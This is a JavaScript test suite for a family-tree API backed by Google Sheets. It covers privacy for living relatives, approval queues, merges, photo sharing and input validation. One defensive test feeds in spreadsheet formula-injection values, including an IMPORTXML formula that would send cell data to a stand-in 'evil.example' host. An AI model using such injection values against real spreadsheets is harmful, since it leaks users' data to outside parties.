// Tests for the Roots API. Run: node apps-script/test/run.js
const assert = require('assert');
const { makeEnv } = require('./harness');

let passed = 0;
const failures = [];
function test(name, fn) {
  try { fn(); passed++; console.log('  ok  ' + name); }
  catch (e) { failures.push(name); console.log('  FAIL ' + name + '\n       ' + (e.stack || e).split('\n').slice(0, 3).join('\n       ')); }
}

const TOK_JONNY = 'jonnyDeviceToken_aaaaaaaaaaaaa';
const TOK_LINDA = 'lindaDeviceToken_bbbbbbbbbbbbb';
const TOK_STRANGER = 'strangerToken_cccccccccccccccc';

function setup() {
  const t = makeEnv();
  t.run('setup');
  const key = t.props.ADMIN_KEY;
  // Jonny seeds the core family with the admin key: auto-approved.
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:me', data: { first_name: 'Jonny', birth_surname: 'Ruzicka', living: 'living', birth_date: 'exact:1975-04-02', notes: 'JONNY-PRIVATE-NOTE' } },
    { kind: 'person', ref: 'new:mom', data: { first_name: 'Carol', middle_name: 'Ann', birth_surname: 'Maidenly', married_names: ['Ruzicka'], living: 'living',
      birth_date: 'exact:1950-01-01', birth_place: 'Cleveland, Ohio', notes: 'MOM-PRIVATE-NOTE', nicknames: 'Cee', sex: 'female' } },
    { kind: 'person', ref: 'new:gpa', data: { first_name: 'Josef', birth_surname: 'Ruzicka', living: 'deceased', birth_date: 'about:1920',
      death_date: 'exact:1990-06-01', notes: 'Worked the rail yards', sex: 'male' }, source: 'family Bible' },
    { kind: 'person', ref: 'new:kid', data: { first_name: 'Sam', birth_surname: 'Ruzicka', living: 'living' } },
    { kind: 'relationship', type: 'parent_child', a: 'new:mom', b: 'new:me' },
    { kind: 'relationship', type: 'parent_child', a: 'new:gpa', b: 'new:mom' },
    { kind: 'relationship', type: 'parent_child', a: 'new:me', b: 'new:kid', subtype: 'adopted' },
    { kind: 'claim', person: 'new:me' }
  ] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  return { t, key, ids: r.ids };
}

console.log('Roots API tests');

test('admin seed is approved immediately and sets the owner', () => {
  const { t, ids } = setup();
  const tree = t.get({ action: 'tree' });
  assert.strictEqual(tree.people.length, 4);
  assert.strictEqual(tree.relationships.length, 3);
  assert.strictEqual(tree.meta.owner_person_id, ids['new:me']);
});

test('living people show names only: first, middle, goes-by, current last', () => {
  const { t, ids } = setup();
  const tree = t.get({ action: 'tree' });
  const mom = tree.people.find(p => p.id === ids['new:mom']);
  assert.deepStrictEqual(Object.keys(mom).sort(), ['added_by', 'first_name', 'id', 'is_placeholder', 'last_name', 'living', 'middle_name', 'nicknames'].sort());
  assert.strictEqual(mom.first_name, 'Carol');
  assert.strictEqual(mom.last_name, 'Ruzicka');
  assert.strictEqual(mom.living, true);
});

test('no private value appears anywhere in the public response', () => {
  const { t } = setup();
  const raw = JSON.stringify(t.get({ action: 'tree' }));
  for (const secret of ['Maidenly', 'MOM-PRIVATE-NOTE', 'JONNY-PRIVATE-NOTE', 'Cleveland', '1950', '1975',
    TOK_JONNY, 'C-', 'merge_log', 'token', 'female']) {
    assert.ok(!raw.includes(secret), 'leaked: ' + secret);
  }
});

test('middle name and goes-by are public, even for living people', () => {
  const { t, ids } = setup();
  const mom = t.get({}).people.find(p => p.id === ids['new:mom']);
  assert.strictEqual(mom.living, true);
  assert.strictEqual(mom.middle_name, 'Ann');
  assert.strictEqual(mom.nicknames, 'Cee');
  assert.strictEqual(mom.last_name, 'Ruzicka');
  assert.strictEqual(mom.birth_surname, undefined);
});

test('deceased people show everything', () => {
  const { t, ids } = setup();
  const gpa = t.get({}).people.find(p => p.id === ids['new:gpa']);
  assert.strictEqual(gpa.living, false);
  assert.strictEqual(gpa.notes, 'Worked the rail yards');
  assert.strictEqual(gpa.birth_date, 'about:1920');
  assert.strictEqual(gpa.source, 'family Bible');
  assert.strictEqual(gpa.sex, 'male');
});

test('submitter names follow privacy rules (Jonny shows as first + last)', () => {
  const { t, ids } = setup();
  const gpa = t.get({}).people.find(p => p.id === ids['new:gpa']);
  assert.strictEqual(gpa.added_by, 'Jonny Ruzicka');
});

test('adoption is hidden when the child is living; shown as plain parent', () => {
  const { t, ids } = setup();
  const rel = t.get({}).relationships.find(r => r.b === ids['new:kid']);
  assert.strictEqual(rel.subtype, 'parent');
  assert.ok(!JSON.stringify(t.get({})).includes('adopted'));
});

test('unknown living status: 110-year rule and death date', () => {
  const { t, key } = setup();
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:a', data: { first_name: 'Old', birth_date: 'about:1900', notes: 'old-note' } },
    { kind: 'person', ref: 'new:b', data: { first_name: 'Young', birth_date: 'exact:1990', notes: 'young-note' } },
    { kind: 'person', ref: 'new:c', data: { first_name: 'After', birth_date: 'after:1900', notes: 'after-note' } },
    { kind: 'person', ref: 'new:d', data: { first_name: 'Dead', death_date: 'exact:2001', notes: 'dead-note' } },
    { kind: 'person', ref: 'new:e', data: { first_name: 'Plain', notes: 'plain-note' } }
  ] });
  const ppl = t.get({}).people;
  const by = n => ppl.find(p => p.first_name === n);
  assert.strictEqual(by('Old').living, false);
  assert.strictEqual(by('Young').living, true);
  assert.strictEqual(by('After').living, true);
  assert.strictEqual(by('Dead').living, false);
  assert.strictEqual(by('Plain').living, true);
  const raw = JSON.stringify(ppl);
  assert.ok(!raw.includes('young-note') && !raw.includes('after-note') && !raw.includes('plain-note'));
  assert.ok(raw.includes('old-note') && raw.includes('dead-note'));
  assert.ok(r.ok);
});

test('relative submissions are pending: invisible to others, visible to the submitter', () => {
  const { t, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, display_name: 'Linda, Carol\'s cousin', items: [
    { kind: 'person', ref: 'new:aunt', data: { first_name: 'Vera', birth_surname: 'Ruzicka', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:aunt' }
  ] });
  assert.strictEqual(r.ok, true, JSON.stringify(r));
  assert.strictEqual(r.status, 'pending');
  const anon = t.get({});
  assert.ok(!JSON.stringify(anon).includes('Vera'));
  assert.ok(!anon.own);
  const stranger = t.get({ token: TOK_STRANGER });
  assert.ok(!JSON.stringify(stranger).includes('Vera'));
  const linda = t.get({ token: TOK_LINDA });
  assert.strictEqual(linda.own.people.length, 1);
  assert.strictEqual(linda.own.people[0].first_name, 'Vera');
  assert.strictEqual(linda.own.relationships.length, 1);
  assert.strictEqual(t.props.NOTIFY_PENDING, '1');
});

test('a relative cannot link to someone else\'s pending person', () => {
  const { t } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', ref: 'new:x', data: { first_name: 'Hidden' } }] });
  const res = t.post({ action: 'submit', token: TOK_STRANGER, items: [
    { kind: 'person', ref: 'new:y', data: { first_name: 'Probe' } },
    { kind: 'relationship', type: 'partner', a: 'new:y', b: r.ids['new:x'] }
  ] });
  assert.strictEqual(res.ok, false);
  // and nothing from the failed batch was written
  assert.ok(!JSON.stringify(t.sheets.People._data).includes('Probe'));
});

test('typed formulas never reach the Sheet as formulas', () => {
  const { t } = setup();
  const evil = '=IMPORTXML("https://evil.example/?"&A1,"//x")';
  const r = t.post({ action: 'submit', token: TOK_LINDA, display_name: '=HYPERLINK("x")', items: [
    { kind: 'person', data: { first_name: evil, notes: '+1+1', birth_place: '@here' }, source: "-'quoted" }
  ] });
  assert.ok(r.ok, JSON.stringify(r));
  assert.deepStrictEqual(t.formulaWrites, []);
  const own = t.get({ token: TOK_LINDA }).own.people[0];
  assert.strictEqual(own.first_name, evil);   // stored and read back exactly as typed
  assert.strictEqual(own.notes, '+1+1');
  assert.strictEqual(own.source, "-'quoted");
});

test('approval: people-first ordering lets a person and their link be approved together', () => {
  const { t, key, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:aunt', data: { first_name: 'Vera', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:aunt' }
  ] });
  const q = t.post({ action: 'admin_queue', key });
  assert.strictEqual(q.batches.length, 1);
  const items = q.batches[0].items.map(i => ({ kind: i.kind, id: i.row.id })).reverse(); // link first on purpose
  const d = t.post({ action: 'admin_approve', key, items });
  assert.deepStrictEqual(d.errors, []);
  const tree = t.get({});
  assert.ok(tree.people.some(p => p.first_name === 'Vera'));
  assert.ok(tree.relationships.some(x => x.b === r.ids['new:aunt']));
});

test('admin actions refuse a wrong key', () => {
  const { t } = setup();
  const r = t.post({ action: 'admin_queue', key: 'nope' });
  assert.strictEqual(r.ok, false);
  const r2 = t.post({ action: 'admin_tree' });
  assert.strictEqual(r2.ok, false);
});

test('admin_tree never includes device tokens', () => {
  const { t, key } = setup();
  const raw = JSON.stringify(t.post({ action: 'admin_tree', key }));
  assert.ok(!raw.includes(TOK_JONNY));
});

test('duplicate link is skipped, not doubled', () => {
  const { t, key, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'relationship', type: 'parent_child', a: ids['new:mom'], b: ids['new:me'] }] });
  assert.strictEqual(r.skipped.length, 1);
});

test('own-ancestor loops are refused', () => {
  const { t, ids } = setup();
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'relationship', type: 'parent_child', a: ids['new:me'], b: ids['new:gpa'] }] });
  assert.strictEqual(r.ok, false);
  assert.ok(/own ancestor/.test(r.error));
});

test('cousin marriage (same ancestor twice) is allowed', () => {
  const { t, key, ids } = setup();
  const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: [
    { kind: 'person', ref: 'new:c1', data: { first_name: 'Cousin1', living: 'deceased' } },
    { kind: 'person', ref: 'new:c2', data: { first_name: 'Cousin2', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:c1' },
    { kind: 'person', ref: 'new:mid', data: { first_name: 'Mid', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:mid' },
    { kind: 'relationship', type: 'parent_child', a: 'new:mid', b: 'new:c2' },
    { kind: 'relationship', type: 'partner', a: 'new:c1', b: 'new:c2', subtype: 'married' }
  ] });
  assert.ok(r.ok, JSON.stringify(r));
});

test('suggestions: approved correction updates the person and keeps both values on record', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: ids['new:gpa'], field: 'birth_date', value: 'exact:1921-03-02', source: 'his draft card' }] });
  const q = t.post({ action: 'admin_queue', key });
  const s = q.batches[0].items[0];
  assert.strictEqual(s.current_value, 'about:1920');
  t.post({ action: 'admin_approve', key, items: [{ kind: 'suggestion', id: s.row.id }] });
  const tree = t.get({});
  assert.strictEqual(tree.people.find(p => p.id === ids['new:gpa']).birth_date, 'exact:1921-03-02');
  assert.strictEqual(tree.history.length, 1);
  assert.strictEqual(tree.history[0].previous_value, 'about:1920');
  assert.strictEqual(tree.history[0].source, 'his draft card');
});

test('corrections to living people never show in public history', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: ids['new:mom'], field: 'birth_place', value: 'Akron, Ohio' }] });
  const q = t.post({ action: 'admin_queue', key });
  t.post({ action: 'admin_approve', key, items: [{ kind: 'suggestion', id: q.batches[0].items[0].row.id }] });
  const raw = JSON.stringify(t.get({}));
  assert.ok(!raw.includes('Akron'));
});

test('photos: pending private, approval publishes, queue flags living people', () => {
  const { t, key, ids } = setup();
  const img = Buffer.from('fakejpegbytes').toString('base64');
  const up = t.post({ action: 'upload_photo', token: TOK_LINDA, image: img, mime: 'image/jpeg', caption: 'Birthday',
    tags: [ids['new:mom'], ids['new:gpa'], ids['new:kid']] });
  assert.ok(up.ok, JSON.stringify(up));
  assert.strictEqual(t.get({}).photos.length, 0);
  const fileId = Object.keys(t.files)[0];
  assert.strictEqual(t.files[fileId].sharing, 'PRIVATE');
  assert.strictEqual(t.get({ token: TOK_LINDA }).own.photos.length, 1);

  const q = t.post({ action: 'admin_queue', key });
  const ph = q.batches[0].items.find(i => i.kind === 'photo');
  assert.deepStrictEqual(ph.living_tagged.map(x => x.id).sort(), [ids['new:mom'], ids['new:kid']].sort());

  t.post({ action: 'admin_approve', key, items: [{ kind: 'photo', id: up.id }] });
  assert.strictEqual(t.files[fileId].sharing, 'ANYONE_WITH_LINK');
  const pub = t.get({}).photos;
  assert.strictEqual(pub.length, 1);
  assert.strictEqual(pub[0].tags.length, 3);

  t.post({ action: 'admin_retract', key, items: [{ kind: 'photo', id: up.id }] });
  assert.strictEqual(t.files[fileId].sharing, 'PRIVATE');
  assert.strictEqual(t.get({}).photos.length, 0);
});

test('photo uploads reject non-images', () => {
  const { t } = setup();
  const r = t.post({ action: 'upload_photo', token: TOK_LINDA, image: 'aGk=', mime: 'text/html' });
  assert.strictEqual(r.ok, false);
});

test('merge folds a duplicate in, and unmerge restores the exact prior state', () => {
  const { t, key, ids } = setup();
  const sub = t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:dup', data: { first_name: 'Josef', birth_surname: 'Ruzicka', living: 'deceased', birth_place: 'Brno' } },
    { kind: 'person', ref: 'new:son', data: { first_name: 'Karel', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: 'new:dup', b: 'new:son' },
    { kind: 'relationship', type: 'parent_child', a: 'new:dup', b: ids['new:mom'] }   // duplicates an existing link after merge
  ] });
  const q = t.post({ action: 'admin_queue', key });
  const dupItem = q.batches[0].items.find(i => i.kind === 'person' && i.row.first_name === 'Josef');
  assert.strictEqual(dupItem.possible_duplicates[0].id, ids['new:gpa']);
  t.post({ action: 'admin_approve', key, items: q.batches[0].items.map(i => ({ kind: i.kind, id: i.row.id })) });

  const snapshot = name => JSON.stringify(t.sheets[name]._data);
  const before = ['People', 'Relationships', 'PhotoTags', 'Suggestions', 'Contributors'].map(snapshot);

  const m = t.post({ action: 'admin_merge', key, keep: ids['new:gpa'], drop: sub.ids['new:dup'] });
  assert.ok(m.ok, JSON.stringify(m));
  const tree = t.get({});
  assert.ok(!tree.people.some(p => p.id === sub.ids['new:dup']));
  const gpa = tree.people.find(p => p.id === ids['new:gpa']);
  assert.strictEqual(gpa.birth_place, 'Brno');                  // blank filled from the duplicate
  assert.ok(tree.relationships.some(r => r.a === ids['new:gpa'] && r.b === sub.ids['new:son']));
  const toMom = tree.relationships.filter(r => r.b === ids['new:mom']);
  assert.strictEqual(toMom.length, 1);                           // duplicate link collapsed

  // a later submission pointing at the merged id lands on the survivor
  const late = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'suggestion', target_id: sub.ids['new:dup'], field: 'notes', value: 'x' }] });
  assert.ok(late.ok, JSON.stringify(late));

  t.post({ action: 'admin_unmerge', key, id: sub.ids['new:dup'] });
  const after = ['People', 'Relationships', 'PhotoTags', 'Suggestions', 'Contributors'].map(snapshot);
  // Everything except the reviewed_at stamp on the dropped person and the later suggestion is back.
  const strip = s => s.replace(/"20\d\d-[^"]*Z"/g, '"T"');
  assert.strictEqual(strip(after[1]), strip(before[1]));
  const peopleBefore = JSON.parse(strip(before[0]));
  const peopleAfter = JSON.parse(strip(after[0]));
  assert.deepStrictEqual(peopleAfter, peopleBefore);
});

test('pause stops relatives but not the admin', () => {
  const { t, key } = setup();
  t.post({ action: 'admin_pause', key, paused: true });
  const r = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'X' } }] });
  assert.strictEqual(r.ok, false);
  const r2 = t.post({ action: 'submit', key, token: TOK_JONNY, items: [{ kind: 'person', data: { first_name: 'Y' } }] });
  assert.ok(r2.ok);
  assert.strictEqual(t.get({}).meta.paused, true);
});

test('daily cap per contributor', () => {
  const { t } = setup();
  let last;
  for (let i = 0; i < 6; i++) {
    last = t.post({ action: 'submit', token: TOK_LINDA, items: Array.from({ length: 60 }, (_, j) => ({ kind: 'person', data: { first_name: 'P' + i + '_' + j } })) });
  }
  assert.strictEqual(last.ok, false);
  assert.ok(/a lot for one day/.test(last.error));
});

test('writes past row 1000 grow the sheet instead of crashing', () => {
  const { t, key } = setup();
  for (let i = 0; i < 17; i++) {
    const r = t.post({ action: 'submit', key, token: TOK_JONNY, items: Array.from({ length: 60 }, (_, j) => ({ kind: 'person', data: { first_name: 'N' + i + '_' + j } })) });
    assert.ok(r.ok, JSON.stringify(r));
  }
  assert.ok(t.get({}).people.length > 1000);
});

test('bad dates and empty names are refused with a readable message', () => {
  const { t } = setup();
  const a = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'A', birth_date: 'March-ish' } }] });
  assert.strictEqual(a.ok, false);
  assert.ok(/birth date/.test(a.error));
  const b = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { notes: 'no name' } }] });
  assert.strictEqual(b.ok, false);
  const c = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { is_placeholder: true } }] });
  assert.ok(c.ok, 'placeholders need no name');
  const d = t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'Dated', birth_date: { year: 1932, qualifier: 'about' } } }] });
  assert.ok(d.ok);
  assert.strictEqual(t.get({ token: TOK_LINDA }).own.people.find(p => p.first_name === 'Dated').birth_date, 'about:1932');
});

test('a pending "this is me" claim shows no name until approved', () => {
  const { t, key, ids } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [
    { kind: 'person', ref: 'new:me', data: { first_name: 'Linda', birth_surname: 'Novak', living: 'living' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:me' },
    { kind: 'claim', person: 'new:me' },
    { kind: 'person', ref: 'new:x', data: { first_name: 'Otto', living: 'deceased' } },
    { kind: 'relationship', type: 'parent_child', a: ids['new:gpa'], b: 'new:x' }
  ] });
  const q = t.post({ action: 'admin_queue', key });
  const all = q.batches.flatMap(b => b.items.map(i => ({ kind: i.kind, id: i.row.id })));
  const noClaim = all.filter(i => i.kind !== 'claim');
  t.post({ action: 'admin_approve', key, items: noClaim });
  let otto = t.get({}).people.find(p => p.first_name === 'Otto');
  assert.strictEqual(otto.added_by, null);
  t.post({ action: 'admin_approve', key, items: all.filter(i => i.kind === 'claim') });
  otto = t.get({}).people.find(p => p.first_name === 'Otto');
  assert.strictEqual(otto.added_by, 'Linda Novak');
});

test('email digest: one email for a burst, none when quiet', () => {
  const { t } = setup();
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'A' } }] });
  t.post({ action: 'submit', token: TOK_LINDA, items: [{ kind: 'person', data: { first_name: 'B' } }] });
  t.run('notifyDigest');
  t.run('notifyDigest');
  assert.strictEqual(t.mails.length, 1);
  assert.ok(/2 waiting/.test(t.mails[0].subject));
});

test('no unexpected server errors were logged', () => {
  // each test builds a fresh env; this one just checks a full happy path is clean
  const { t } = setup();
  t.get({ token: TOK_JONNY });
  assert.deepStrictEqual(t.env._errors, []);
});

console.log(`\n${passed} passed, ${failures.length} failed`);
if (failures.length) process.exit(1);
